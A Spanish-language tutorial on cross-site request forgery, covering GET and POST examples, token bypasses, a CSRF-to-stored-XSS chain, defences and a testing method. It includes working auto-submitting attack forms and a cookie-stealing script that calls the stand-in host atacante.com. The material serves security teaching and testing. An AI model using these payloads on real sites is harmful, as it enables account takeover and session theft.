# ¿Qué es CSRF (Cross-Site Request Forgery)?

CSRF, o Falsificación de Peticiones en Sitios Cruzados, es un tipo de ataque que obliga a un usuario final autenticado a ejecutar acciones no deseadas en una aplicación web en la que tiene una sesión activa. El atacante prepara una petición maliciosa y engaña al navegador de la víctima para que la envíe al sitio vulnerable. Como el navegador de la víctima envía automáticamente las cookies de sesión asociadas con el sitio, la petición se procesa como si fuera una acción legítima del usuario.

**Condiciones para un ataque CSRF exitoso:**

1. **Acción Relevante:** Existe una acción en la aplicación objetivo que el atacante quiere realizar (e.g., cambiar email, transferir fondos, añadir un usuario admin).
2. **Manejo de Sesión Basado en Cookies:** La aplicación usa cookies para gestionar las sesiones y el navegador las envía automáticamente con cada petición al dominio correspondiente.
3. **Parámetros de Petición Predecibles:** Todos los parámetros necesarios para ejecutar la acción son conocidos o predecibles por el atacante. No hay parámetros secretos o impredecibles (como un token CSRF válido) que el atacante no pueda obtener o adivinar.

### Ejemplo Básico: CSRF con Petición GET

Las peticiones GET son las más fáciles de explotar para CSRF, ya que pueden ser activadas por simples enlaces o recursos embebidos.

**Escenario:** Un sitio permite comprar criptomonedas mediante una petición GET. `http://cryptosite.com/buy.php?wallet=[DIRECCION_ATACANTE]&amount=100&type=BTC`

**Explotación:**

1. **Enlace malicioso:** El atacante puede enviar un email o mensaje a la víctima c

```html
  <a href="http://cryptosite.com/buy.php?wallet=DIRECCION_ATACANTE&amount=100&type=BTC">¡Gana un iPhone!</a>
```

2. **Imagen embebida (sin interacción del usuario más allá de cargar la página del atacante):**

```html
 <img src="http://cryptosite.com/buy.php?wallet=DIRECCION_ATACANTE&amount=100&type=BTC" width="1" height="1" alt="pixel">
```

Si la víctima está autenticada en `cryptosite.com` y carga la página del atacante (o hace clic en el enlace), su navegador enviará la petición GET a `cryptosite.com` junto con sus cookies de sesión, ejecutando la compra.

**Ejemplo práctico (Notifications en CTFIO Hub):** URL vulnerable (activa notificaciones): `https://[yourhub].ctfio.com/notifications?enabled=true`

**Simulación Local (Página del Atacante):**

1. Crea un archivo `index.html` en tu máquina:

```html
  <html>
  <body>
  <h1>Página del Atacante</h1>
  <p>¡Contenido interesante aquí!</p>
  <img src="https://[yourhub].ctfio.com/notifications?enabled=true" width="1" height="1">
 <br>
 <a href="https://[yourhub].ctfio.com/notifications?enabled=true">Haz clic para una sorpresa</a>
 </body>
</html>
```

2. Sirve esta página localmente:
   - **Apache:** `sudo cp index.html /var/www/html/` y accede a `http://localhost/index.html`.
   - **Python:** Navega al directorio donde guardaste `index.html` y ejecuta `python3 -m http.server 8000`. Accede a `http://localhost:8000/index.html`.

### Ejemplo: CSRF con Petición POST

Las peticiones POST son un poco más complejas de explotar que las GET, pero igualmente vulnerables si no hay protecciones.

**Formulario Vulnerable en `victim-site.com/email_change`:**

```html
<form method="post" action="/email_change_action">
  <label>New Email Address:</label>
  <input name="email" value="current_user@victim.com">
  <input type="submit" value="Update Email">
</form>
```

**Formulario del Atacante en `attacker-site.com`:** El atacante crea una página con un formulario que apunta al endpoint vulnerable, pero con valores maliciosos y, opcionalmente, lo auto-envía.

```html
<html>
  <body onload="document.csrf_form.submit()"> <p>Cargando...</p>
    <form name="csrf_form" action="https://victim-site.com/email_change_action" method="post">
      <input type="hidden" name="email" value="hacker@evil.com">
      <input type="submit" value="Gana un Premio (Falso)">
    </form>
  </body>
</html>
```

Cuando la víctima visita la página del atacante, el formulario se envía automáticamente. Su navegador adjuntará las cookies de sesión de `victim-site.com`, y el email se cambiará al del atacante.

### Protecciones CSRF y sus Bypasses

La contramedida más común contra CSRF es el uso de **Tokens Anti-CSRF**.

**¿Cómo funcionan los Tokens Anti-CSRF (Synchronizer Token Pattern)?**

1. Cuando el usuario solicita un formulario o una página que realiza una acción sensible, el servidor genera un token único y secreto.
2. Este token se incrusta como un campo oculto en el formulario y/o se almacena en la sesión del usuario en el servidor.
3. Cuando el usuario envía el formulario, el token se envía de vuelta al servidor.
4. El servidor compara el token recibido con el que tiene almacenado (o asociado a la sesión). Si coinciden, la petición es válida. Si no, se rechaza.

Un atacante no puede adivinar este token para incluirlo en su formulario CSRF.

**Bypasses Comunes de Tokens CSRF:**

1. **Token Ausente o No Validado por el Servidor:**
   - Simplemente se omite el parámetro del token en la petición CSRF. Si el servidor no lo valida, el ataque funciona.
2. **Token Presente pero la Validación Puede Ser Bypasseada:**
   - Enviar un token vacío o un token de longitud incorrecta, y ver si el servidor lo acepta.
3. **Cambio de Método HTTP:**
   - La aplicación valida el token solo para peticiones POST. Si la misma acción puede realizarse mediante una petición GET (que no suele requerir el token), el atacante puede usar CSRF vía GET.
     - Ejemplo: `POST /delete_user?user_id=123&csrf_token=XYZ` (protegido)
     - Prueba: `GET /delete_user?user_id=123` (podría funcionar sin token)
4. **Token Filtrado (Leaked):**
   - **Referer Header:** Si el token se incluye en la URL y el sitio hace peticiones a sitios externos, el token podría filtrarse a través de la cabecera `Referer`.
   - **XSS:** Una vulnerabilidad XSS en el sitio puede usarse para leer el token del DOM y luego realizar una petición CSRF válida.
   - **Otras Fugas de Información:** Si el token se muestra en algún lugar accesible o se loguea incorrectamente.
5. **Token Débil o Predecible:**
   - Si el token se genera de forma predecible (e.g., basado en timestamp, o es un simple hash de datos conocidos), el atacante podría generarlo.
   - El ejemplo de "Decodificación Base64" que tenías podría encajar aquí si el token es un objeto (como un JWT) firmado débilmente o sin firmar, donde el atacante pudiera modificar partes y re-firmar (o no necesitar firmar). Sin embargo, esto es más complejo que un simple CSRF token. Generalmente, los tokens CSRF son strings opacos.
     - Si un token es: `base64_encode(json_encode({"user_id": 123, "timestamp": "..."}))` y no está firmado o la firma es trivial, un atacante podría intentar forjarlo. Esto es una implementación muy pobre.
6. **Alcance del Token Incorrecto (Token No Vinculado a la Acción o Usuario Específico):**
   - El mismo token es válido para todas las acciones de un usuario, o incluso para todos los usuarios. Un atacante podría obtener un token válido (e.g., de su propia cuenta) e intentar usarlo en un ataque CSRF contra otra cuenta.
7. **Reutilización de Tokens / Token No Es de Un Solo Uso:**
   - Si un token sigue siendo válido después de ser usado una vez.
8. **Manejo Inseguro de "Double Submit Cookies":**
   - En este patrón, el token se envía tanto en una cookie como en un parámetro de la petición. El servidor solo verifica que ambos coincidan.
   - Si el sitio tiene una vulnerabilidad que permita al atacante establecer cookies para el dominio víctima (e.g., una XSS en un subdominio, o si el sitio acepta cookies de subdominios de forma insegura), el atacante podría fijar su propio par cookie/token.

**Ejemplo de Formulario CSRF Omitiendo Token (si no se valida):**

```html
<body onload="document.csrf_form.submit()">
  <form name="csrf_form" action="https://victim-site.com/change_password" method="post">
    <input type="hidden" name="new_password" value="HackedPassword123">
    <input type="hidden" name="confirm_password" value="HackedPassword123">
    </form>
</body>
```

### Escalada de Self-XSS a XSS "Real" mediante CSRF

**Self-XSS (Auto-XSS):** Es un tipo de XSS donde el atacante solo puede ejecutar el script en su propio navegador o sesión. Por ejemplo, si inyecta un payload en un campo de su perfil que solo él ve, o si el payload requiere una interacción manual muy específica del propio usuario. Tradicionalmente, se considera de bajo impacto porque el atacante no puede forzar su ejecución en navegadores de otras víctimas.

**Encadenamiento CSRF + Self-XSS:** Se puede convertir un Self-XSS en un XSS explotable contra otras víctimas combinándolo con CSRF.

**Escenario:**

1. **Vulnerabilidad Self-XSS:** Un campo en `https://victim-site.com/profile_update` permite al usuario guardar un payload XSS (e.g., en el campo "nombre"), pero este script solo se ejecuta cuando el propio usuario ve su perfil o la página donde se refleja.
   - Payload Self-XSS: `<script>alert('Self-XSS ejecutado para: ' + document.domain)</script>`
2. **Acción CSRF:** La actualización del perfil se realiza mediante una petición POST a `https://victim-site.com/profile_update_action` sin una protección CSRF robusta.

**Explotación Combinada:** El atacante crea una página web maliciosa que contiene un formulario CSRF. Este formulario apunta al endpoint de actualización del perfil y tiene campos ocultos que contienen el payload de Self-XSS.

**Página del Atacante (`attacker-site.com/exploit.html`):**

```html
<html>
  <body onload="document.csrf_xss_form.submit()">
    <p>Cargando contenido exclusivo...</p>
    <form name="csrf_xss_form" action="https://victim-site.com/profile_update_action" method="post">
      <input type="hidden" name="username" value="Víctima"> <input type="hidden" name="name" value="<script>var i=new Image(); i.src='//atacante.com/steal?c='+document.cookie;</script>">
      <input type="hidden" name="description" value="Este es mi nuevo perfil con XSS!">
      </form>
  </body>
</html>
```

**Flujo del Ataque:**

1. El atacante engaña a una víctima (que está autenticada en `victim-site.com`) para que visite `attacker-site.com/exploit.html`.
2. El JavaScript en la página del atacante auto-envía el formulario CSRF.
3. El navegador de la víctima envía la petición POST a `https_victim-site.com/profile_update_action` con las cookies de sesión de la víctima.
4. El servidor de `victim-site.com` procesa la petición y actualiza el perfil de la víctima, guardando el payload XSS (`<script>...document.cookie...</script>`) en el campo "nombre".
5. Ahora, cuando la víctima (o cualquier otra persona, si el perfil es público y el XSS es Stored) visite la página donde se muestra el nombre del perfil, el payload XSS se ejecutará en su navegador, robando sus cookies (o realizando cualquier otra acción maliciosa).

El Self-XSS, que antes solo afectaba al atacante, ahora se ha convertido en un Stored XSS (o Reflected XSS, dependiendo de cómo se muestre el campo) funcional contra la víctima, todo gracias al CSRF.

### Otras Defensas CSRF (Además de Tokens)

- **Cookies SameSite (`Lax` o `Strict`):**
  - Es una de las defensas más efectivas y modernas. Indica al navegador cuándo debe enviar cookies con peticiones cross-site.
  - `Strict`: Las cookies solo se envían si la petición se origina desde el mismo sitio. Bloquea casi todos los CSRF.
  - `Lax`: Las cookies se envían con navegación de alto nivel (e.g., clic en un enlace) pero no con peticiones cross-site "no seguras" (POST, PUT, DELETE) ni con subrecursos (`<img>`, `<iframe>`). `Lax` es el valor por defecto para nuevas cookies en muchos navegadores. Mitiga la mayoría de CSRF vía POST.
- **Comprobación de Cabeceras `Origin` y/o `Referer`:**
  - El servidor puede verificar que la petición provenga de un origen esperado.
  - `Origin`: Enviada por el navegador en peticiones cross-origin (POST, PUT, DELETE, y CORS).
  - `Referer`: Enviada por el navegador indicando la URL de la página anterior.
  - **Limitaciones:** Pueden ser eliminadas por el navegador por razones de privacidad, o a veces pueden ser falseadas o bypassadas en escenarios específicos (e.g., si la política del Referer es muy laxa, o mediante otros exploits). No deben ser la única defensa.
- **Re-autenticación del Usuario:**
  - Para acciones extremadamente sensibles (cambio de contraseña, confirmación de pagos importantes), requerir que el usuario vuelva a introducir su contraseña.

### Metodología de Testeo para CSRF

1. **Identificar Funcionalidades Clave:** Lista todas las acciones que cambian estado en la aplicación (crear, modificar, borrar datos, funciones que ejecutan acciones).
2. **Analizar Peticiones:** Para cada acción, captura la petición HTTP (GET o POST) y sus parámetros.
3. **Verificar Protecciones CSRF:**
   - ¿Hay un token anti-CSRF?
   - ¿Cómo se genera? ¿Dónde se envía (parámetro, cabecera)?
4. **Intentar Bypasses del Token (si existe):**
   - ¿Qué pasa si omites el token?
   - ¿Qué pasa si envías un token vacío o inválido?
   - ¿Se valida el token para todos los métodos HTTP que permiten la acción (GET, POST)?
   - ¿Puedes obtener un token de tu sesión y usarlo contra otra víctima?
   - ¿Se puede predecir el token?
5. **Comprobar Otras Protecciones:**
   - ¿Se usan cookies SameSite? ¿Con qué política (`Lax`, `Strict`)?
   - ¿Se validan las cabeceras `Origin` o `Referer`? ¿Se pueden bypassar?
6. **Construir el PoC:** Si encuentras una vulnerabilidad, crea un PoC (prueba de concepto) HTML/JS para demostrar el impacto.
